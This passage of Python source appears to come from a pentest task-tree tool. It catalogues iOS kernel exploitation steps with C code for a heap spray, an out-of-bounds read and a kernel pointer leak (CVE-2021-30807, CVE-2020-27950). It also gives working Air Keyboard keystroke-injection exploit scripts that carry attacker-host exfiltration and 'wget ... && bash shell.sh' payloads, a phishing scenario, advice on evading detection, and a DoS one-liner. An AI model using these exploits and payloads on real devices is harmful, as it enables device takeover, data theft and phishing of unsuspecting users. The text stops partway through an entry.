                            'Add IOSurface heap spray',
                            'Calculate precise OOB offset',
                            'Develop arbitrary read primitive'
                        ]
                    }
                },
                {
                    'id': 'iomfb-arb-read',
                    'name': 'IOMobileFrameBuffer Arbitrary Read',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Achieve arbitrary kernel read via CVE-2021-30807',
                        'tags': ['OSCP:HIGH', 'RESEARCH', 'IOS', 'CVE'],
                        'notes': """
Arbitrary Read Exploitation:

Key Insights:
1. External method 83 calls IOSurfaceRoot::copyPortNameForSurfaceInTask(...)
2. Returns: Mach port NAME (u32 handle), NOT raw kernel address
3. Port name is userspace handle to kernel IOSurface object
4. Can use IOSurface methods to manipulate "IOSurface" (really arbitrary memory!)

Exploitation Flow:

Step 1: IOSurface Heap Spray
```c
// Create many IOSurfaces with small allocations
for (i = 0; i < SURFACES_COUNT; i++) {
    surface_ids[i] = create_surface(iosurface_uc);

    // Spray small values to fill kalloc zones
    IOSurface_spray_with_gc(iosurface_uc, surface_ids[i],
                            20, 200,  // rounds, items per round
                            data, sizeof(data), NULL);
}
```

Step 2: Trigger OOB Read
```c
// Index chosen to hit sprayed region
// offset = 0x1200000 + 0x1048
// Kernel computes: this + 0xA58 + (offset/8)*8
uint64_t scalars[1] = { (0x1200000 + 0x1048) / 8 };

IOConnectCallMethod(appleclcd_uc, 83,
                    scalars, 1, NULL, 0,
                    output, &size, NULL, NULL);

// output[0] = Mach port name to "IOSurface" at OOB address
```

Step 3: Use Port for Read/Write
```c
// Convert port name to surface ID
uint32_t surface_id = s_lookup_surface_from_port(output[0]);

// Now can use IOSurface methods on arbitrary memory!
// - Read: s_get_value (if memory structured correctly)
// - Write: s_set_value (controlled data injection)
```

Challenges:
- Must shape heap so OOB slot contains valid IOSurface pointer
- Spray success rate ~60-80% (probabilistic)
- Requires understanding IOSurface structure for primitives

Result: Arbitrary kernel memory read/write from sandboxed process!
                        """,
                        'alternatives': [
                            'Direct spray tuning: Adjust spray count and timing',
                            'Alternative objects: Try Mach ports instead of IOSurface',
                            'Info leak combo: Combine with CVE-2020-27950 for addresses'
                        ],
                        'success_indicators': [
                            'Port name returned successfully',
                            'OOB read hits valid IOSurface pointer',
                            'Can manipulate "IOSurface" via methods'
                        ],
                        'failure_indicators': [
                            'Kernel panic (spray failed)',
                            'Invalid port name returned',
                            'IOSurface methods fail'
                        ],
                        'next_steps': [
                            'Develop stable kernel read primitive',
                            'Leak kernel pointers (task_t, etc.)',
                            'Escalate to full kernel r/w'
                        ]
                    }
                }
            ]
        })

        # SECTION 6: CVE-2020-27950 (Mach Message Trailer)
        tasks['children'].append({
            'id': 'cve-2020-27950',
            'name': 'CVE-2020-27950: Mach Message Trailer Leak',
            'type': 'parent',
            'children': [
                {
                    'id': 'mach-trailer-bug',
                    'name': 'Mach Message Trailer Vulnerability',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Analyze mach_msg_trailer_t uninitialized field leak',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH', 'IOS', 'CVE'],
                        'notes': """
CVE-2020-27950: Kernel Memory Leak via Mach Message Trailer

Affected: iOS < 14.2

Vulnerability Mechanism:

Mach Message Structure:
- Every Mach message has HEADER + BODY + TRAILER
- Trailer: Variable-length metadata (seqno, tokens, labels, etc.)
- Kernel ALWAYS reserves MAX_TRAILER_SIZE (68 bytes)
- Kernel only initializes SOME trailer fields

Trailer Fields:
```c
typedef struct {
    mach_msg_trailer_type_t  msgh_trailer_type;
    mach_msg_trailer_size_t  msgh_trailer_size;
    mach_port_seqno_t        msgh_seqno;
    security_token_t         msgh_sender;
    audit_token_t            msgh_audit;
    mach_port_context_t      msgh_context;
    int                      msgh_ad;        // ← UNINITIALIZED!
    msg_labels_t             msgh_labels;
} mach_msg_mac_trailer_t;
```

The Bug (ipc_kmsg_add_trailer):
```c
// Partial initialization
trailer->msgh_sender = current_thread()->task->sec_token;
trailer->msgh_audit = current_thread()->task->audit_token;
trailer->msgh_labels.sender = 0;

// Conditional initialization based on user option
if (option >= MACH_RCV_TRAILER_AV) {  // option >= 7
    trailer->msgh_ad = 0;  // Only initialized if option >= 7!
}
```

Exploitation:
- User controls 'option' parameter in mach_msg()
- Valid options: 0-8 (checked with MACH_RCV_TRAILER_MASK)
- If option = 5 or 6:
  * Passes mask check (bits 24-27 nonzero)
  * Does NOT initialize msgh_ad (< MACH_RCV_TRAILER_AV)
  * msgh_ad contains STALE KERNEL MEMORY!

Leak Primitive:
- Send Mach message with port descriptors
- Userland: descriptor.name = uint32 port name
- Kernel: descriptor.name = ipc_port* pointer (64-bit!)
- Free/reuse kalloc chunk
- Receive with MACH_RCV_TRAILER_ELEMENTS(5)
- msgh_ad field contains low/high 4 bytes of stale ipc_port*!
                        """,
                        'alternatives': [
                            'Study Synacktiv writeup: https://www.synacktiv.com/en/publications/ios-1-day-hunting-uncovering-and-exploiting-cve-2020-27950-kernel-memory-leak',
                            'Analyze XNU source: osfmk/ipc/ipc_kmsg.c',
                            'Test on iOS 14.0-14.1 (vulnerable versions)'
                        ],
                        'success_indicators': [
                            'Trailer initialization logic understood',
                            'Option parameter bypass identified',
                            'msgh_ad leak mechanism verified'
                        ],
                        'next_steps': [
                            'Test basic leak PoC',
                            'Develop kernel address leak',
                            'Combine with other primitives'
                        ]
                    }
                },
                {
                    'id': 'mach-trailer-basic-leak',
                    'name': 'Basic Trailer Memory Leak PoC',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Leak random kernel memory via uninitialized msgh_ad field',
                        'tags': ['OSCP:LOW', 'RESEARCH', 'IOS', 'CVE'],
                        'notes': """
Basic Memory Leak PoC:

Concept: Trigger uninitialized msgh_ad field to leak stale bytes

Code Pattern:
```c
mach_port_t port;
mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

// Send simple message to self
mach_msg_header_t msg;
msg.msgh_remote_port = port;
msg.msgh_size = sizeof(msg);
msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);

mach_msg(&msg, MACH_SEND_MSG, sizeof(msg), 0,
         MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

// Receive with invalid trailer option (5 or 6)
uint8_t buffer[1024];
mach_msg((mach_msg_header_t *)buffer,
         MACH_RCV_MSG | MACH_RCV_TRAILER_ELEMENTS(5),  // KEY!
         0, sizeof(buffer), port,
         MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

// Extract trailer
mach_msg_mac_trailer_t *trailer =
    (mach_msg_mac_trailer_t *)(buffer + msg.msgh_size);

// msgh_ad contains random kernel memory!
printf("Leaked: 0x%x\\n", trailer->msgh_ad);
```

Expected Output:
- msgh_ad contains non-zero garbage (stale kernel data)
- Proves uninitialized memory leak
- Value is unpredictable (whatever was in kalloc chunk before)

Limitations:
- Leaked data is random (not targeted)
- Need heap shaping for useful leaks
- Next step: Control what ends up in msgh_ad
                        """,
                        'success_indicators': [
                            'Non-zero msgh_ad value leaked',
                            'Stale kernel memory confirmed',
                            'PoC works on iOS < 14.2'
                        ],
                        'failure_indicators': [
                            'iOS 14.2+ (patched)',
                            'msgh_ad always zero',
                            'Trailer option validation changed'
                        ],
                        'next_steps': [
                            'Shape heap for targeted leaks',
                            'Leak kernel pointers (ipc_port*)',
                            'Develop KASLR bypass'
                        ]
                    }
                },
                {
                    'id': 'mach-trailer-kaddr-leak',
                    'name': 'Kernel Address Leak via Trailer',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Leak full 64-bit kernel pointer using Mach message descriptors',
                        'tags': ['OSCP:HIGH', 'RESEARCH', 'IOS', 'CVE'],
                        'notes': """
Kernel Address Leak Technique:

Strategy: Use OOL port descriptors to plant kernel pointers in kalloc chunk,
then reuse chunk with smaller message to leak pointers via msgh_ad field.

Key Insight:
- mach_msg_port_descriptor_t in userland: .name = uint32 port name
- In kernel ipc_kmsg: .name = ipc_port* (64-bit pointer!)
- Sending message with descriptors fills kernel buffer with pointers
- Freeing and reusing chunk leaves stale pointers
- Smaller message + trailer overlap → msgh_ad leaks pointer bytes!

Exploitation Flow:

1. Create "Big" Message (50 descriptors):
```c
typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t sent_ports[50];  // Many descriptors
} message_big_t;

// Fill all descriptors with same port
for (int i = 0; i < 50; i++) {
    big_msg->sent_ports[i].name = sent_port;
    big_msg->sent_ports[i].type = MACH_MSG_PORT_DESCRIPTOR;
}
```

2. Send and Immediately Discard:
```c
// Send → allocates kalloc.1024 with 50 ipc_port* pointers
mach_msg(&big_msg->header, MACH_SEND_MSG, big_size, 0, ...);

// Receive with zero-size buffer → frees chunk, leaves pointers
mach_msg((mach_msg_header_t *)0, MACH_RCV_MSG, 0, 0, port, ...);
```

3. Reuse with "Small" Message (40 descriptors + shifted size):
```c
// Fewer descriptors → trailer sits earlier in chunk
// Add +4 to msgh_size → shift overlap window
small_msg->header.msgh_size = small_size + 4;

mach_msg(&small_msg->header, MACH_SEND_MSG, ...);

// Receive with TRAILER_ELEMENTS(5)
mach_msg(buffer, MACH_RCV_MSG | MACH_RCV_TRAILER_ELEMENTS(5), ...);

// Trailer overlaps stale descriptor area
trailer = (mach_msg_mac_trailer_t *)(buffer + small_size + 4);
low_32 = trailer->msgh_ad;  // Low 4 bytes of ipc_port*
```

4. Repeat with +8 offset to get high 32 bits:
```c
small_msg->header.msgh_size = small_size + 8;
// ... send/receive ...
high_32 = trailer->msgh_ad;

// Reconstruct full 64-bit pointer
kernel_ptr = low_32 | ((uint64_t)high_32 << 32);
```

Result: Full 64-bit kernel pointer leaked! (KASLR bypass)

Success Rate: ~95% (kalloc reuse very reliable)
                        """,
                        'alternatives': [
                            'Adjust descriptor count for different kalloc sizes',
                            'Try different offset shifts (+2, +6, etc.)',
                            'Combine with other info leaks for validation'
                        ],
                        'success_indicators': [
                            'Valid kernel pointer leaked',
                            'Pointer in expected kernel address range',
                            'KASLR bypass achieved'
                        ],
                        'failure_indicators': [
                            'Leaked value is zero or userspace address',
                            'Kalloc reuse failed',
                            'iOS 14.2+ (patched)'
                        ],
                        'next_steps': [
                            'Calculate kernel slide from leaked pointer',
                            'Find other kernel structures via read primitive',
                            'Combine with CVE-2021-30807 for full exploit'
                        ]
                    }
                }
            ]
        })

        # SECTION 7: iOS Kernel Research Tools
        tasks['children'].append({
            'id': 'ios-research-tools',
            'name': 'iOS Kernel Research Tools & Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': 'ghidra-bindiff-setup',
                    'name': 'Ghidra + BinDiff Setup for Kernel Analysis',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Set up Ghidra and BinDiff for iOS kernel version diffing',
                        'tags': ['OSCP:LOW', 'RESEARCH', 'IOS', 'TOOLS'],
                        'notes': """
Ghidra + BinDiff Setup for iOS Kernel Diffing:

Purpose: Compare vulnerable vs patched kernelcache to find security fixes

Installation Steps:

1. Download BinDiff:
   - URL: https://www.zynamics.com/bindiff/manual
   - Download DMG for macOS
   - Install BinDiff application

2. Install Ghidra BinExport Plugin:
   - Open Ghidra: ghidraRun
   - File → Install Extensions
   - Click "+" button
   - Navigate: /Applications/BinDiff/Extra/Ghidra/BinExport
   - Select plugin, click OK
   - Restart Ghidra (ignore version mismatch warnings)

3. Download iOS Firmware:
   - Visit: https://ipsw.me/
   - Download vulnerable version (e.g., iOS 14.7)
   - Download patched version (e.g., iOS 14.7.1)
   - Files are .ipsw format (ZIP archives)

4. Extract Kernelcache:
   - Unzip .ipsw file
   - Find kernelcache.release.* or kernelcache.development.*
   - Decrypt if encrypted:
     * Use img4tool: img4tool -e kernelcache.release.iphone12 -o kernelcache.dec
     * Or iBoot64Patcher, etc.

5. Import to Ghidra:
   - Create new Ghidra project
   - Import both kernelcaches (vulnerable + patched)
   - Language: AARCH64:LE:v8A (64-bit ARM)
   - Open each kernelcache → auto-analyze

6. Export BinExport Files:
   - Right-click kernelcache in project
   - Export → Binary BinExport (v2) for BinDiff
   - Repeat for both versions

7. Diff in BinDiff:
   - Open BinDiff application
   - Create new workspace
   - Add new diff
   - Primary: Vulnerable kernelcache .BinExport
   - Secondary: Patched kernelcache .BinExport
   - Run diff → see changed functions!

Use Cases:
- Find patched functions (likely contained vulnerabilities)
- Reverse engineer security fixes
- Identify 1-day vulnerabilities for research
                        """,
                        'alternatives': [
                            'IDA Pro + Diaphora plugin (commercial alternative)',
                            'radare2 + r2diaphora (open-source)',
                            'Manual function comparison in Ghidra side-by-side'
                        ],
                        'success_indicators': [
                            'BinDiff successfully installed',
                            'Kernelcaches imported to Ghidra',
                            'Diff shows changed functions'
                        ],
                        'next_steps': [
                            'Analyze changed functions for vulnerabilities',
                            'Cross-reference with CVE disclosures',
                            'Develop PoC for identified bugs'
                        ]
                    }
                },
                {
                    'id': 'xnu-version-mapping',
                    'name': 'iOS to XNU Version Mapping',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Map iOS versions to XNU kernel releases for vulnerability research',
                        'tags': ['OSCP:LOW', 'RESEARCH', 'IOS'],
                        'notes': """
Finding XNU Version for iOS Release:

Resource: https://www.theiphonewiki.com/wiki/kernel

Why It Matters:
- iOS version != XNU version
- Vulnerabilities are in XNU kernel, not iOS userland
- Need XNU version to find source code, patches, vulnerabilities

Example Mapping:
| iOS Version | XNU Version                                                          |
|-------------|----------------------------------------------------------------------|
| 15.1        | Darwin Kernel Version 21.1.0: Wed Oct 13 19:14:48 PDT 2021; root:xnu-8019.43.1~1/RELEASE_ARM64_T8006 |
| 15.0        | xnu-8019.41.5 (RELEASE_ARM64_T8101)                                  |
| 14.7.1      | xnu-7195.141.2 (patched CVE-2021-30807)                              |
| 14.7        | xnu-7195.141.1 (vulnerable to CVE-2021-30807)                        |
| 14.2        | xnu-7195.60.75 (patched CVE-2020-27950)                              |
| 14.0        | xnu-7195.0.46 (vulnerable to CVE-2020-27950)                         |

How to Check on Device:
```bash
# SSH into jailbroken device
uname -a

# Output: Darwin iPhone 21.1.0 Darwin Kernel Version 21.1.0: ...
# 21.1.0 = XNU version
```

How to Check in Kernelcache:
```bash
# Extract version string
strings kernelcache | grep "Darwin Kernel Version"

# Or use jtool
jtool -l kernelcache | grep "LC_VERSION_MIN"
```

Research Workflow:
1. Identify target iOS version (e.g., iOS 14.7)
2. Look up XNU version (xnu-7195.141.1)
3. Download XNU source from opensource.apple.com
4. Compare with patched version (xnu-7195.141.2)
5. Identify security fixes → find vulnerabilities!

Multiple Versions:
- iOS 15.1, 15.1 RC, 15.1.1 may ALL use SAME XNU (21.1.0)
- Security patches sometimes in iOS minor versions only
- Always verify XNU version, not just iOS number
                        """,
                        'alternatives': [
                            'Check Apple open source: https://opensource.apple.com/source/xnu/',
                            'Use ipsw.me to download specific firmware versions',
                            'Analyze kernelcache directly with jtool/jtool2'
                        ],
                        'success_indicators': [
                            'XNU version identified for target iOS',
                            'Correct source code downloaded',
                            'Version mapping documented'
                        ],
                        'next_steps': [
                            'Download XNU source for analysis',
                            'Compare vulnerable vs patched versions',
                            'Identify security commits in git history'
                        ]
                    }
                },
                {
                    'id': 'corellium-setup',
                    'name': 'Corellium Virtual iOS Device Setup',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Set up Corellium virtual iOS device for kernel exploitation research',
                        'tags': ['OSCP:LOW', 'RESEARCH', 'IOS', 'TOOLS'],
                        'notes': """
Corellium Virtual iOS Device Setup:

What is Corellium?
- Virtual iOS device platform (runs iOS in VMs)
- Full kernel debugging support
- Network packet capture
- Snapshots for quick restore after crashes
- Used extensively in iOS security research

Features for Exploitation:
- LLDB kernel debugging (breakpoints, memory inspection)
- Instant reset after kernel panics
- Network traffic analysis
- SSH access to virtual device
- Custom kernel loading

Limitations:
- Commercial product (expensive for individuals)
- Some hardware features not emulated (SEP, etc.)
- May not perfectly match physical device behavior
- Primarily for research, not production testing

Setup Process (if you have access):
1. Create Corellium account at corellium.com
2. Create new virtual device (choose iOS version)
3. Wait for device boot (~5-10 minutes)
4. Enable SSH in device settings
5. Connect via SSH: ssh root@<device-ip>
6. Load custom kernel or run exploits

Alternative (Free):
- Use older physical devices (iPhone 6s, iPhone 7)
- Jailbreak with checkra1n (hardware exploit, unpatchable)
- Install lldb, kernel debugging tools
- Much cheaper, but can brick device if not careful

For OSCP/Education:
- Physical jailbroken device recommended
- Corellium if you have institutional access
- Focus on understanding concepts, not just running tools
                        """,
                        'alternatives': [
                            'Physical jailbroken device (iPhone 6s - iPhone X era)',
                            'qemu-ios (limited, experimental)',
                            'QEMU + XNU build (complex setup)'
                        ],
                        'success_indicators': [
                            'Virtual device booted successfully',
                            'SSH access working',
                            'Can run exploits and test crashes'
                        ],
                        'next_steps': [
                            'Test kernel exploits in safe environment',
                            'Debug with LLDB for learning',
                            'Snapshot before risky operations'
                        ]
                    }
                }
            ]
        })

        # SECTION 8: iOS Network Service Attacks (Air Keyboard & Similar)
        tasks['children'].append({
            'id': 'ios-network-service-attacks',
            'name': 'iOS Network Service Attacks (Air Keyboard Remote Input Injection)',
            'type': 'parent',
            'children': [
                {
                    'id': 'ios-service-discovery',
                    'name': 'Discover Vulnerable iOS Network Services',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap -p 8888,55535 --open {target}/24',
                        'description': 'Scan for vulnerable mobile keyboard/remote control apps (Air Keyboard, Telepad, etc.)',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '-p': 'Port specification (8888=iOS Air Keyboard, 55535=Android)',
                            '--open': 'Show only open ports',
                            '/24': 'Scan entire subnet'
                        },
                        'notes': """
Vulnerable Mobile Remote Input Apps (Local Network):

Air Keyboard (iOS):
- Port 8888/TCP (unencrypted listener)
- NO authentication required
- Accepts keystroke injection from any LAN device
- Versions affected: ALL including latest (July 2025 - still unpatched)

Related Vulnerable Apps:
1. Telepad ≤ 1.0.7 (CVE-2022-45477/78)
   - Unauthenticated command execution
   - Plain-text key-logging

2. PC Keyboard ≤ 30 (CVE-2022-45479/80)
   - Unauthenticated RCE
   - Traffic snooping

3. Lazy Mouse ≤ 2.0.1 (CVE-2022-45481/82/83)
   - Default no-password mode
   - Weak PIN brute-force
   - Clear-text credential leakage

4. Air Keyboard Android (Port 55535)
   - Weak AES-ECB handshake
   - DoS via crafted packets

Attack Surface:
- Mobile "remote keyboard" apps expose LAN services
- Designed for convenience, NOT security
- No origin verification, weak/no authentication
- Full input control = complete device takeover

Why Dangerous:
- User types: passwords, messages, emails, commands
- Attacker sees/controls ALL keyboard input
- Can open malicious URLs, install apps, send messages
- Victim has NO indication of compromise

Discovery Commands:
# Find devices with port 8888 open
nmap -p 8888 --open 192.168.1.0/24

# Quick scan for both iOS and Android
nmap -p 8888,55535 --open 192.168.0.0/16

# Identify running service on Android
adb shell netstat -tulpn | grep 55535
adb shell "lsof -i :55535"
                        """,
                        'success_indicators': [
                            'Port 8888 or 55535 open',
                            'Device responds to TCP connection',
                            'Service banner identifies Air Keyboard or similar'
                        ],
                        'failure_indicators': [
                            'No open ports found',
                            'Firewall blocking connections',
                            'App not installed on target devices'
                        ],
                        'alternatives': [
                            'Wireshark filter: tcp.port == 8888',
                            'Manual: nc -zv 192.168.1.1-254 8888',
                            'masscan -p8888,55535 192.168.0.0/16'
                        ],
                        'next_steps': [
                            'Identify iOS version (≤ 1.0.4 vs ≥ 1.0.5)',
                            'Test keystroke injection',
                            'Document app version and device details'
                        ]
                    }
                },
                {
                    'id': 'air-keyboard-protocol-analysis',
                    'name': 'Air Keyboard Protocol Analysis',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Understand Air Keyboard protocol formats (legacy TCP vs modern WebSocket)',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                        'notes': """
Air Keyboard Protocol Evolution:

VERSION ≤ 1.0.4 (Legacy - Custom Binary Protocol):
Transport: Raw TCP on port 8888
Frame Format:
  [length (2 bytes little-endian)]
  [device_id (1 byte)]
  [payload (ASCII keystrokes)]

Length Field:
- Includes device_id byte
- Does NOT include 2-byte header itself
- Little-endian encoding (LSB first)

Example Payload: "hello"
Bytes: 0x06 0x00 0x01 0x68 0x65 0x6C 0x6C 0x6F
       ^length  ^ID  ^h   ^e   ^l   ^l   ^o
Length = 6 (5 chars + 1 device_id byte)

VERSION ≥ 1.0.5 (Modern - WebSocket + JSON):
Transport: WebSocket on port 8888 (same port!)
Frame Format: JSON objects

Minimal Keystroke:
```json
{
  "type": 1,              // 1 = insert text, 2 = special key
  "text": "payload here",
  "mode": 0,
  "shiftKey": false,
  "selectionStart": 0,
  "selectionEnd": 0
}
```

Key Types:
- type=1: Regular text insertion
- type=2: Special keys (Enter, Delete, etc.)

No Handshake Required:
- First WebSocket message = first injection
- NO authentication token
- NO origin validation
- NO encryption

Attack Flow:
1. Open WebSocket to ws://<target>:8888
2. Send JSON with malicious "text" field
3. Keystrokes appear on victim's iOS device
4. Close connection (or keep open for continuous injection)

Security Failures:
1. NO TLS (plain-text transmission)
2. NO authentication (any LAN device can connect)
3. NO origin verification (CSRF-like attack)
4. NO rate limiting (can spam keystrokes)
5. NO user confirmation (silent injection)

Impact:
- Attacker can type anything on victim's device
- Open URLs: {"text": "https://evil.com\\n"}
- Launch apps: {"text": "spotify\\n"} (in Spotlight)
- Send messages: Open Messages, type message, send
- Steal data: Type commands to exfiltrate (if jailbroken)
                        """,
                        'success_indicators': [
                            'Protocol version identified',
                            'Packet structure understood',
                            'Can craft valid injection payloads'
                        ],
                        'alternatives': [
                            'Wireshark capture of legitimate session',
                            'Decompile Air Keyboard app with Hopper/Ghidra',
                            'Test with nc/websocat manually'
                        ],
                        'next_steps': [
                            'Develop PoC exploit scripts',
                            'Test different payload types',
                            'Measure injection success rate'
                        ]
                    }
                },
                {
                    'id': 'air-keyboard-exploit-legacy',
                    'name': 'Exploit Air Keyboard ≤ 1.0.4 (TCP)',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 air_keyboard_legacy_exploit.py {target}',
                        'description': 'Inject keystrokes into Air Keyboard ≤ 1.0.4 via raw TCP',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'flag_explanations': {
                            'target': 'Victim iOS device IP address',
                            'keystrokes': 'Payload text to inject (ASCII)'
                        },
                        'notes': """
Legacy TCP Exploitation (Air Keyboard ≤ 1.0.4):

Python PoC:
```python
#!/usr/bin/env python3
\"\"\"Air Keyboard ≤ 1.0.4 Remote Keystroke Injection\"\"\"
import socket
import sys

def inject_keystrokes(target_ip, payload):
    \"\"\"Inject keystrokes via legacy TCP protocol\"\"\"

    # Encode payload
    keystrokes = payload.encode('ascii')

    # Build frame: [length][device_id][payload]
    length = len(keystrokes) + 1  # +1 for device_id byte

    # Little-endian 2-byte length header
    frame = bytes([length & 0xff, (length >> 8) & 0xff])

    # Device ID (hard-coded to 1)
    frame += b"\\x01"

    # Payload
    frame += keystrokes

    # Send to target
    with socket.create_connection((target_ip, 8888), timeout=5) as s:
        s.sendall(frame)
        print(f"[+] Injected: {payload}")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <payload>")
        print(f"Example: {sys.argv[0]} 192.168.1.50 'open -a Calculator'")
        sys.exit(1)

    target = sys.argv[1]
    payload = sys.argv[2]

    inject_keystrokes(target, payload)
```

Attack Scenarios:

1. Open Malicious URL:
   Payload: "https://evil.com/phishing\\n"
   - Opens Safari browser
   - Loads attacker-controlled page
   - Can exploit browser vulnerabilities

2. Launch Application:
   Payload: "calculator\\n"
   - Opens Spotlight search
   - Types app name
   - Launches app (harmless demo)

3. Send iMessage:
   Payload: (multi-step automation)
   - Open Messages app
   - Type recipient
   - Type message
   - Send (requires timing)

4. Exfiltrate Data (if jailbroken):
   Payload: "curl http://attacker.com/?data=$(cat /etc/passwd)\\n"
   - Execute shell command
   - Send data to attacker server

5. Install Profile (MDM bypass):
   Payload: URL to malicious configuration profile
   - Trick user into installing
   - Gain device management control

Success Rate: ~95% (highly reliable on vulnerable versions)

Limitations:
- ASCII only (no special Unicode characters)
- Timing-dependent for multi-step attacks
- User may see keystrokes appearing (if screen unlocked)
                        """,
                        'success_indicators': [
                            'Keystrokes appear on target device',
                            'Payload executes successfully',
                            'No error from target service'
                        ],
                        'failure_indicators': [
                            'Connection refused (app not running)',
                            'Target uses version ≥ 1.0.5 (WebSocket)',
                            'Network firewall blocks port 8888'
                        ],
                        'alternatives': [
                            'Manual: echo -ne "\\x06\\x00\\x01hello" | nc <target> 8888',
                            'Metasploit module (if exists)',
                            'Custom C exploit for embedded systems'
                        ],
                        'next_steps': [
                            'Test various payloads (URLs, commands)',
                            'Automate multi-step attack sequences',
                            'Develop iOS version ≥ 1.0.5 exploit (WebSocket)'
                        ]
                    }
                },
                {
                    'id': 'air-keyboard-exploit-websocket',
                    'name': 'Exploit Air Keyboard ≥ 1.0.5 (WebSocket)',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 air_keyboard_ws_exploit.py {target}',
                        'description': 'Inject keystrokes into Air Keyboard ≥ 1.0.5 via WebSocket JSON',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'flag_explanations': {
                            'websocket': 'WebSocket protocol (ws://)',
                            'json.dumps': 'Convert Python dict to JSON string',
                            'type': 'Keystroke type (1=text, 2=special key)'
                        },
                        'notes': """
Modern WebSocket Exploitation (Air Keyboard ≥ 1.0.5):

Python PoC:
```python
#!/usr/bin/env python3
\"\"\"Air Keyboard ≥ 1.0.5 Remote Keystroke Injection\"\"\"
import json
import sys
import websocket  # pip install websocket-client

def inject_via_websocket(target_ip, payload):
    \"\"\"Inject keystrokes via WebSocket JSON protocol\"\"\"

    # Connect to WebSocket
    ws_url = f"ws://{target_ip}:8888"
    ws = websocket.create_connection(ws_url)

    # Build JSON payload
    keystroke = {
        "type": 1,               # 1 = insert text
        "text": payload,
        "mode": 0,
        "shiftKey": False,
        "selectionStart": 0,
        "selectionEnd": 0
    }

    # Send JSON
    ws.send(json.dumps(keystroke))
    ws.close()

    print(f"[+] WebSocket injection successful: {payload}")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <payload>")
        print(f"Example: {sys.argv[0]} 192.168.1.50 'https://evil.com'")
        sys.exit(1)

    target = sys.argv[1]
    payload = sys.argv[2]

    inject_via_websocket(target, payload)
```

Installation:
```bash
pip3 install websocket-client
```

Advanced Payloads:

1. Open URL in Safari:
```python
payload = "https://attacker.com/payload\\n"
# \\n triggers Enter key → Opens URL
```

2. Launch App via Spotlight:
```python
payload = "Settings\\n"
# Opens Spotlight, types "Settings", hits Enter
```

3. Multi-line Command (jailbroken):
```python
payload = "Terminal\\n"  # Open terminal app
# Wait, then send command:
payload = "wget http://attacker.com/shell.sh && bash shell.sh\\n"
```

4. Spam Attack (DoS/Annoyance):
```python
for i in range(1000):
    inject_via_websocket(target, "HACKED! " * 10)
# Floods device with text
```

5. Phishing Attack:
```python
# Open Messages app
inject_via_websocket(target, "Messages\\n")
time.sleep(2)
# Type recipient
inject_via_websocket(target, "Mom\\n")
time.sleep(1)
# Type phishing message
inject_via_websocket(target, "Click this: https://fake-bank.com\\n")
# Sends message to "Mom"
```

Continuous Injection Session:
```python
ws = websocket.create_connection(f"ws://{target}:8888")

# Keep connection open for multiple injections
commands = [
    "open https://evil.com",
    "Settings",
    # ... more payloads
]

for cmd in commands:
    ws.send(json.dumps({"type": 1, "text": cmd}))
    time.sleep(1)

ws.close()
```

Defense Evasion:
- Inject slowly (avoid suspicion)
- Use timing to match user behavior
- Inject when screen is off (blind typing)

Success Rate: ~98% (WebSocket protocol more reliable)
                        """,
                        'success_indicators': [
                            'WebSocket connection established',
                            'Keystrokes appear on target',
                            'JSON payload accepted'
                        ],
                        'failure_indicators': [
                            'WebSocket handshake fails',
                            'Target uses legacy version (TCP)',
                            'Invalid JSON rejected'
                        ],
                        'alternatives': [
                            'Manual: websocat ws://target:8888',
                            'Browser console: new WebSocket("ws://target:8888")',
                            'Burp Suite Repeater (WebSocket tab)'
                        ],
                        'next_steps': [
                            'Develop persistent backdoor (keep WS open)',
                            'Create interactive shell via keystrokes',
                            'Test on multiple iOS versions'
                        ]
                    }
                },
                {
                    'id': 'android-air-keyboard-dos',
                    'name': 'Android Air Keyboard DoS Attack',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 -c "import socket; socket.create_connection((\\"{target}\\", 55535)).send(b\\"A\\"*32)"',
                        'description': 'Crash Android Air Keyboard service via malformed AES handshake',
                        'tags': ['OSCP:LOW', 'DOS'],
                        'flag_explanations': {
                            'port 55535': 'Android Air Keyboard service port',
                            'b"A"*32': '32 bytes of garbage data (malformed packet)'
                        },
                        'notes': """
Android Air Keyboard DoS Vulnerability:

Vulnerability Details:
- Android version listens on port 55535
- Expects AES-128-ECB encrypted handshake
- Parsing errors bubble up to OpenSSL AES_decrypt()
- Unhandled exception crashes background service

Exploitation:
- Send ANY malformed data to port 55535
- Service attempts AES decryption
- Exception not caught → service terminates
- Legitimate users disconnected until app restart

Impact:
- Denial of Service (app stops working)
- User must manually relaunch app
- Repeated crashes = permanent DoS

Python One-Liner:
```python
python3 -c "import socket; socket.create_connection(('192.168.1.50', 55535)).send(b'X'*32)"
```

Bash Alternative:
```bash
echo -n "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | nc 192.168.1.50 55535
```

Packet Analysis:
- Service expects: [4-byte encrypted password][random nonce]
- AES-128-ECB with hard-coded static key
- Invalid ciphertext → AES_decrypt() throws exception
- Exception propagates to native code → SEGFAULT

Root Cause:
